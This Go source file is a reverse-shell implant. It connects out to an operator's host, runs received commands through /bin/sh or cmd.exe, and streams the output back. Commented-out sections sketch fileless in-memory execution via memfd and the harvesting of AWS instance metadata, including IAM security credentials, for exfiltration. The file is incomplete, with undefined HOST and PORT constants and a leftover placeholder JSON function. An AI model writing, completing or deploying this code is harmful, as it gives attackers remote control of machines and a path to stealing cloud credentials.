package main

import (
    "fmt"
    "net"
    "os/exec"
    _ "os/user"
    "io"
    "io/ioutil"
    "bufio"
    "strings"
    "encoding/json"
    _ "net/http"
    _ "log"
    "runtime"
    _ "syscall"
)







/*
func init_info(system string){
    if system == "Linux"{
        //---------------------------
        //create map
        check_env := map[string]string{}
        check_env["SYSTEM"] = system

        //---------------------------
        //Username
        user, err := user.Current()
        if err != nil {
            log.Fatalf(err.Error())
        }

        username := user.Username
        check_env["USER"] = username

        //---------------------------
        utsname := &syscall.Utsname{}
        //uname := charsToString(utsname.Machine)
        uname := utsname.Machine

        fmt.Println(uname)
        return check_env
    }
}
*/

func check_env(system string){
    json_array := `{"species":"pigeon", "decription": "likes to perch on rocks"}`
    if string(json_array[0]) == "["{
        m := []map[string]string{}
        err := json.Unmarshal([]byte(json_array), &m)
        if err != nil {
            fmt.Println(err)
        }
        for _, result := range m{
            fmt.Println(result["species"])
        }
    }else{
        m := map[string]string{}
        err := json.Unmarshal([]byte(json_array), &m)
        if err != nil {
            fmt.Println(err)
        }

        fmt.Println(m["species"])
    }
}

/*
func meta_data(){
    metadata := map[string]string {}

    metatest := map[string]string {
        "user-data":"user-data",
        "ami-id":"meta-data/ami-id",
        "instance-id":"meta-data/instance-id",
        "instance-type":"meta-data/instance-type",
        "local-ipv4":"meta-data/local-ipv4",
        "local-hostname": "meta-data/local-hostname",
        "public-ipv4":"meta-data/public-ipv4",
        "public-hostname": "meta-data/public-hostname",
        "security-groups":"meta-data/security-groups",
        "reservation-id":"meta-data/reservation-id",
    }

    iam_metatest := map[string]string {
        "iam-info": "meta-data/iam/info",
        "ec2-role": "meta-data/iam/security-credentials/",
    }

    adv_metatest := map[string]string {
        "macs": "network/interfaces/macs",
    }

    interfaces := map[string]string {
        "interface-id":"interface-id",
        "local-hostname":"local-hostname",
        "local-ipv4s":"local-hostname",
        "public-hostname": "public-hostname",
        "public-ipv4s": "public-hostname",
        "security-groups": "security-groups",
        "security-group-id": "security-group-ids",
        "subnet-ipv4-cidr-block": "subnet-ipv4-cidr-block",
        "vpc-id": "vpc-id",
        "vpc-ipv4-cidr-block": "vpc-ipv4-cidr-block",
        "vpc-ipv4-cidr-blocks": "vpc-ipv4-cidr-blocks",
    }

    var metalink = "http://169.254.169.254"

    for key, element := range interfaces{
        link := fmt.Sprintf("%s/%s", metalink, element)
        fmt.Println(link)
        resp, err := http.Get(link)
        //http.Get(metalink + "/" + element)

        if err != nil {
		    log.Fatal(err)
	    }

        defer resp.Body.Close()
        body, err := ioutil.ReadAll(resp.Body)
        //fmt.Sprintf("%s", string(body))
        if err != nil {
            log.Fatal(err)
        }
        bodyString := string(body)
        response_body := fmt.Sprintf("%s: %s", key, bodyString)
        fmt.Println(response_body)
    }
}
*/

func main() {
    sock := fmt.Sprintf("%s:%s", HOST, PORT)
    fmt.Println(sock)

    conn, err := net.Dial("tcp", sock)
    if err == nil {
        fmt.Println("Connection successful")
    }

    for true{
        msg, _ := bufio.NewReader(conn).ReadString('\n')
        comm := strings.TrimSpace(string(msg))
        command := strings.NewReader(comm)


        if comm == "exit" || comm == "quit"{
            fmt.Println("TCP client exiting...")
            conn.Close()
            return

        /*}else if comm == "run_in_memory"{
            var n = 2
            b := make([]byte, n)
            for i := range b {
                b[i] = letterBytes[rand.Intn(len(letterBytes))]
            }

            Data, err := getURLContent(path)

            mfd, err := memfd.Create()
            mfd.Write(Data)
            filePath := fmt.Sprintf("/proc/self/fd/%d", mfd.Fd())
            cmd := exec.Command(filePath)
            out, err := cmd.Run()
        */
        }else if comm == "check_env"{
            fmt.Println("Check_Env")
            if _, err := conn.Write([]byte("Check_Env")); err != nil {
					conn.Close()
				}
            //var check_env_data = init_info(system)
            //fmt.Println(check_env_data)
            /*var system = runtime.GOOS
            var check_env_data = init_info(system)
            var metadata = meta_data()
            check_env_data['META-DATA'] = metadata
            //check_env_data_str = json.dumps(check_env_data)
            fmt.Println(check_env_data)
            //senddt = str_xor(check_env_data_str, ENCKEY)
            //s.send(senddt.encode())
            */
        } else{
            //fmt.Println(string(msg))
            //var command = strings.TrimSpace(string(msg))
            fmt.Println("Executing Command...")
            cmd := exec.Command("/bin/sh", "-i")
            if runtime.GOOS == "windows" {
                comm, _ := ioutil.ReadAll(command)
                cmd = exec.Command("cmd.exe", "/C", string(comm))
            }

            //send(cmd, conn)

            rp, wp := io.Pipe()
            //cmd.Stdin, _ = bufio.NewReader(conn).ReadString('\n')
            cmd.Stdin = command
            cmd.Stdout = wp
            go io.Copy(conn, rp)

            if err := cmd.Run(); err != nil {
                fmt.Println("Error: ", err)
            }
        }
    }
}
